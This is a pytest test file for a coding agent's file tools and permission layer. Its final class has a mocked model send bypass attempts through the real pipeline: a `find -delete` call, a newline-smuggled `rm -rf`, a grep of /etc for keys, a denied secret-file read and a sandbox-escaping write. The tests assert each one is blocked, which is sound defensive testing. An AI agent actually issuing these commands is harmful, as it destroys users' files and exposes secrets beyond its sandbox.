    @pytest.mark.skipif(sys.platform != "win32", reason="GBK/mbcs 编码探测仅 Windows 提供")
    def test_read_and_edit_gbk_file(self, tmp_path):
        """GBK 编码文件可读可编辑（严格 utf-8 解码会 UnicodeDecodeError）。"""
        import asyncio

        from mewcode.tools.edit_file import EditFile
        from mewcode.tools.edit_file import Params as EditParams
        from mewcode.tools.read_file import Params as ReadParams
        from mewcode.tools.read_file import ReadFile

        f = tmp_path / "gbk.txt"
        f.write_bytes("中文内容第一行\n第二行\n".encode("gbk"))

        r = asyncio.run(ReadFile().execute(ReadParams.model_validate({
            "file_path": str(f),
        })))
        assert not r.is_error
        assert "中文内容第一行" in r.output

        r = asyncio.run(EditFile().execute(EditParams.model_validate({
            "file_path": str(f), "old_string": "第二行", "new_string": "改好了",
        })))
        assert not r.is_error
        assert "改好了".encode("gbk") in f.read_bytes()

    def test_crlf_file_edit_keeps_crlf(self, tmp_path):
        import asyncio

        from mewcode.tools.edit_file import EditFile
        from mewcode.tools.edit_file import Params as EditParams

        f = tmp_path / "crlf.txt"
        f.write_bytes(b"a\r\nb\r\nc\r\n")
        tool = EditFile()
        r = asyncio.run(tool.execute(EditParams.model_validate({
            "file_path": str(f), "old_string": "b", "new_string": "B",
        })))
        assert not r.is_error
        assert f.read_bytes() == b"a\r\nB\r\nc\r\n", f.read_bytes()

    def test_rejected_write_not_tracked_in_history(self, tmp_path):
        """被 read-before-write 门禁拒绝的写不得进入撤销历史。"""
        import asyncio

        from mewcode.filehistory import FileHistory
        from mewcode.tools.file_state_cache import FileStateCache
        from mewcode.tools.write_file import Params as WriteParams
        from mewcode.tools.write_file import WriteFile

        f = tmp_path / "x.txt"
        f.write_text("original")
        history = FileHistory(str(tmp_path), session_id="t")
        tool = WriteFile(file_history=history, file_state_cache=FileStateCache())

        r = asyncio.run(tool.execute(WriteParams.model_validate({
            "file_path": str(f), "content": "hacked",
        })))
        assert r.is_error
        assert history._tracked == {}, history._tracked

    def test_negative_offset_rejected_by_validation(self):
        from pydantic import ValidationError

        from mewcode.tools.read_file import Params as ReadParams

        with pytest.raises(ValidationError):
            ReadParams.model_validate({"file_path": "x", "offset": -1})


# ---------------------------------------------------------------------------
# F3.2 工具层阻塞 I/O 移出事件循环 + grep 加固
# ---------------------------------------------------------------------------

class TestGrepHardening:
    def test_binary_file_skipped_no_pseudo_match(self, tmp_path):
        import asyncio

        from mewcode.tools.grep import Grep, Params

        binary = tmp_path / "blob.bin"
        binary.write_bytes(b"secretkey\x00\x01\x02" * 100)
        (tmp_path / "text.txt").write_text("secretkey here\n")

        r = asyncio.run(Grep().execute(Params.model_validate({
            "pattern": "secretkey", "path": str(tmp_path),
        })))
        assert "blob.bin" not in r.output
        assert "text.txt" in r.output

    def test_oversized_file_skipped(self, tmp_path):
        import asyncio

        from mewcode.tools.grep import Grep, Params

        big = tmp_path / "big.log"
        big.write_text("needle\n" * 200_000)
        (tmp_path / "small.txt").write_text("needle\n")

        r = asyncio.run(Grep().execute(Params.model_validate({
            "pattern": "needle", "path": str(tmp_path),
        })))
        assert "big.log" not in r.output
        assert "small.txt" in r.output

    def test_result_cap(self, tmp_path):
        import asyncio

        from mewcode.tools.grep import GREP_MAX_RESULTS, Grep, Params

        for i in range(50):
            (tmp_path / f"f{i:03}.txt").write_text("hit\n" * 10)

        r = asyncio.run(Grep().execute(Params.model_validate({
            "pattern": "hit", "path": str(tmp_path),
        })))
        assert r.output.count("\n") <= GREP_MAX_RESULTS + 1

    def test_grep_does_not_block_event_loop(self, tmp_path):
        """扫描期间心跳协程持续推进（未在 to_thread 外同步执行）。"""
        import asyncio

        from mewcode.tools.grep import Grep, Params

        for i in range(5000):
            (tmp_path / f"f{i:04}.txt").write_text("x\n" * 200)

        async def _run():
            heartbeats = 0

            async def heartbeat():
                nonlocal heartbeats
                while True:
                    await asyncio.sleep(0.002)
                    heartbeats += 1

            hb = asyncio.create_task(heartbeat())
            # 让心跳先跑起来再开始扫描
            await asyncio.sleep(0.004)
            baseline = heartbeats
            await asyncio.wait_for(
                Grep().execute(Params.model_validate({
                    "pattern": "x", "path": str(tmp_path),
                })),
                timeout=5.0,
            )
            hb.cancel()
            # 若扫描同步阻塞事件循环，心跳在扫描期间一跳都不会有；
            # to_thread 下 2ms 间隔的心跳必然继续推进
            assert heartbeats >= baseline + 1, (
                f"event loop starved: {heartbeats - baseline} beats during scan"
            )

        asyncio.run(_run())

# ---------------------------------------------------------------------------
# F4.3: file_state_cache ↔ FileCache ↔ rewind 联动
#       （read-before-write 门禁 + 回滚后缓存一致）
# ---------------------------------------------------------------------------

class TestFileStateCacheRewindLinkage:
    def _write_tool(self, file_cache, state_cache):
        from mewcode.tools.write_file import WriteFile

        return WriteFile(file_cache=file_cache, file_state_cache=state_cache)

    def test_write_requires_read_first(self, tmp_path: Path) -> None:
        from mewcode.cache import FileCache
        from mewcode.tools.file_state_cache import FileStateCache

        target = tmp_path / "doc.txt"
        target.write_text("hello", encoding="utf-8")
        tool = self._write_tool(FileCache(), FileStateCache())
        params = _write_params(file_path=str(target), content="new")

        result = asyncio.run(tool.execute(params))

        assert result.is_error is True
        assert "read" in result.output.lower()

    def test_rewind_stale_state_cache_blocks_write_until_reread(
        self, tmp_path: Path
    ) -> None:
        # 回滚把文件内容换回旧版本（mtime 变化），read-before-write 门禁
        # 基于过期快照的编辑必须被拒——防止 agent 拿回滚前的旧内容继续写。
        from mewcode.cache import FileCache
        from mewcode.filehistory.history import FileHistory
        from mewcode.tools.file_state_cache import FileStateCache

        target = tmp_path / "doc.txt"
        target.write_text("old content", encoding="utf-8")

        state_cache = FileStateCache()
        file_cache = FileCache()
        tool = self._write_tool(file_cache, state_cache)
        params = _write_params(file_path=str(target), content="new content")

        # 正常流程：读过 → 允许写
        state_cache.record(str(target.resolve()), "old content",
                           target.stat().st_mtime_ns)
        result = asyncio.run(tool.execute(params))
        assert result.is_error is False

        # /rewind：FileHistory 把文件恢复为更早的内容（mtime 变化）
        fh = FileHistory(str(tmp_path), "s1")
        target.write_text("pre-rewind", encoding="utf-8")
        fh.track_edit(str(target))
        fh.make_snapshot(0, "checkpoint")
        target.write_text("restored-by-rewind", encoding="utf-8")
        fh.track_edit(str(target))
        fh.rewind(0)
        file_cache.invalidate(str(target.resolve()))

        # 状态缓存还记着回滚前的快照 → 门禁必须拦截，直到重新 ReadFile
        result = asyncio.run(tool.execute(params))
        assert result.is_error is True

    def test_reread_after_rewind_allows_write(self, tmp_path: Path) -> None:
        from mewcode.cache import FileCache
        from mewcode.filehistory.history import FileHistory
        from mewcode.tools.file_state_cache import FileStateCache

        target = tmp_path / "doc.txt"
        target.write_text("v1", encoding="utf-8")

        state_cache = FileStateCache()
        tool = self._write_tool(FileCache(), state_cache)
        params = _write_params(file_path=str(target), content="v2")

        state_cache.record(str(target.resolve()), "v1", target.stat().st_mtime_ns)

        # 回滚发生，缓存过期
        fh = FileHistory(str(tmp_path), "s1")
        fh.track_edit(str(target))
        fh.make_snapshot(0, "cp")
        target.write_text("v0", encoding="utf-8")
        fh.track_edit(str(target))
        fh.rewind(0)

        assert asyncio.run(tool.execute(params)).is_error is True

        # 重新读 → 记录新 mtime → 门禁放行
        state_cache.record(str(target.resolve()), target.read_text(encoding="utf-8"),
                           target.stat().st_mtime_ns)
        result = asyncio.run(tool.execute(params))
        assert result.is_error is False
        assert target.read_text(encoding="utf-8") == "v2"


def _write_params(file_path: str, content: str):
    from mewcode.tools.write_file import WriteFile

    return WriteFile.params_model(file_path=file_path, content=content)

# ---------------------------------------------------------------------------
# F4.4: 端到端红线——完整 Agent.run 走真实权限管线装配
# ---------------------------------------------------------------------------

class TestEndToEndBypassRedLines:
    """MockLLM 驱动完整 Agent.run，把审查报告的代表绕过序列发给真实管线。

    防止"单测过了但管线装配漏了"的集成盲区：任何一条被拦失败都说明
    权限层没有被正确装配进执行路径。
    """

    @staticmethod
    def _collect(agent: Agent, conv: ConversationManager, response: str = "DENY"):
        results: dict[str, ToolResultEvent] = {}
        requests: list[PermissionRequest] = []

        async def _run() -> None:
            async for e in agent.run(conv):
                if isinstance(e, PermissionRequest):
                    requests.append(e)
                    e.future.set_result(
                        PermissionResponse.DENY if response == "DENY"
                        else PermissionResponse.ALLOW
                    )
                elif isinstance(e, ToolResultEvent):
                    results[e.tool_id] = e

        asyncio.run(_run())
        return results, requests

    def test_parallel_read_with_deny_and_find_delete(self, tmp_path: Path) -> None:
        """§3.1 + §3.2：并行批次 [deny 的 ReadFile, find -delete] 全部被拦。"""
        (tmp_path / "keep.py").write_text("keep", encoding="utf-8")
        (tmp_path / "secret.env").write_text("KEY=hidden", encoding="utf-8")
        (tmp_path / "local_rules.yaml").write_text(
            "- rule: 'ReadFile(*secret.env)'\n  effect: deny\n",
            encoding="utf-8",
        )

        client = MockLLMClient([
            [
                _read_call("t1", tmp_path / "secret.env"),
                ToolCallComplete("t2", "Bash", {"command": 'find . -name "*.py" -delete'}),
                StreamEnd("end_turn", input_tokens=10, output_tokens=20),
            ],
            [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
        ])
        agent = _make_agent(tmp_path, client)
        results, _ = self._collect(
            agent, ConversationManager().model_copy() if False else _conv("do it")
        )

        assert results["t1"].is_error
        assert "KEY=hidden" not in results["t1"].output
        assert results["t2"].is_error
        assert (tmp_path / "keep.py").exists()

    def test_shell_injection_via_newline_never_executes(
        self, tmp_path: Path
    ) -> None:
        """§3.3：`echo hi
rm -rf ...` 必须触发人工确认且默认拒绝后不执行。"""
        canary = tmp_path / "canary.txt"
        canary.write_text("still here", encoding="utf-8")

        cmd = "echo hi\nrm -rf " + str(tmp_path).replace("\\", "/")
        client = MockLLMClient([
            [
                ToolCallComplete("t1", "Bash", {"command": cmd}),
                StreamEnd("end_turn", input_tokens=10, output_tokens=20),
            ],
            [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
        ])
        agent = _make_agent(tmp_path, client)
        results, requests = self._collect(agent, _conv("echo then rm"))

        # 两条等价的拦截路径：命中危险黑名单直接 deny，或走人工确认。
        # 唯一不可接受的是放行执行。
        assert requests or results["t1"].is_error, (
            "newline-injected command must be blocked (ask or deny)"
        )
        assert not requests or results["t1"].is_error
        assert canary.exists()

    def test_grep_dotssh_outside_sandbox_blocked(self, tmp_path: Path) -> None:
        """§3.4：Grep 指向沙箱外的系统敏感目录必须被拒。"""

        outside = "C:/Users" if sys.platform == "win32" else "/etc"
        client = MockLLMClient([
            [
                ToolCallComplete(
                    "t1", "Grep", {"pattern": "KEY", "path": outside}
                ),
                StreamEnd("end_turn", input_tokens=10, output_tokens=20),
            ],
            [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
        ])
        agent = _make_agent(tmp_path, client)
        tool = agent.registry.get("Grep")
        assert tool is not None

        results, _ = self._collect(agent, _conv("scan ssh keys"))

        assert results["t1"].is_error

    def test_plan_mode_cannot_write_fake_plan_path(self, tmp_path: Path) -> None:
        """§3.7：PLAN 模式借裸子串 .mewcode/plans/ 写沙箱外被拦。"""
        outside_dir = tmp_path.parent / "e2e-persist" / ".mewcode" / "plans"
        target = outside_dir / "x.md"
        client = MockLLMClient([
            [
                ToolCallComplete(
                    "t1", "WriteFile",
                    {"file_path": str(target), "content": "escaped"},
                ),
                StreamEnd("end_turn", input_tokens=10, output_tokens=20),
            ],
            [TextDelta("done."), StreamEnd("end_turn", input_tokens=5, output_tokens=5)],
        ])
        agent = _make_agent(tmp_path, client)
        agent.permission_checker.mode = PermissionMode.PLAN

        results, requests = self._collect(agent, _conv("save the plan"))

        assert results["t1"].is_error
        assert not target.exists()


def _conv(text: str) -> ConversationManager:
    conv = ConversationManager()
    conv.add_user_message(text)
    return conv
